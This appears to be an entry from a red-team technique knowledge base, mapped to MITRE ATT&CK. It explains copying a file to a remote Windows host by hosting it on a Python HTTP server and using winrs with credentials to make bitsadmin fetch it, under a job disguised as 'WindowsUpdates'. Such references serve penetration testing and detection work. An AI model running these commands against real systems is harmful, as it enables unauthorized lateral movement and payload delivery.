---
id: adc89bbb-a2f6-4305-99b4-a8ed05a92ee5
name: Copy file from HTTP to remote host WinRS + BitsAdmin
type: procedure
verified: false
submitted: false
created_at: '2023-01-12T22:08:55.736455+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Remote File Copy|T1105 - Remote File Copy]]'
platforms:
- Windows
tags:
- '[[file transfer]]'
commands:
- '[[Copy file to remote machine Bitsadmin LOL]]'
- '[[Launch a Python 3 Web Server]]'
---

# Copy file from HTTP to remote host WinRS + BitsAdmin

## Summary

Copy a file using user or admin credentials of a remote machine using WInRS to authenticate and initiate a command, and bitsadmin on the remote machine to fetch the file from an http server you have hosted on the same network. The HTTP server can be any server accessible by the target machine. If i

## Description

# Description

Copy a file using user or admin credentials of a remote machine using WInRS to authenticate and initiate a command, and bitsadmin on the remote machine to fetch the file from an http server you have hosted on the same network.

The HTTP server can be any server accessible by the target machine. If it has internet access, the HTTP server can be hosted on the internet.

## Objective

1. Setup HTTP server to host file

2. Authenticate to the remote machine and execute bitsadmin to download the file from the HTTP server

# Instructions

1. Run the HTTP server in the same directory as the file to deliver and remember the IP address of this HTTP server

**Command** ([[Launch a Python 3 Web Server]]):

```bash
python3 -m http.server $_PORT
```

2. Authenticate and download the file to the remote machines Public folder

**Command** ([[Copy file to remote machine Bitsadmin LOL]]):

```bash
winrs -r:$SERVER -u:.\$USER -p:$PASSWORD "bitsadmin /transfer WindowsUpdates /priority normal http://$HTTP_SERVER/$FILENAME c:\\Users\\Public\$FILENAME"
```

## Platforms

- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Remote File Copy|T1105 - Remote File Copy]]

## Commands Used

- [[Copy file to remote machine Bitsadmin LOL]]
- [[Launch a Python 3 Web Server]]

## Tags

- [[file transfer]]
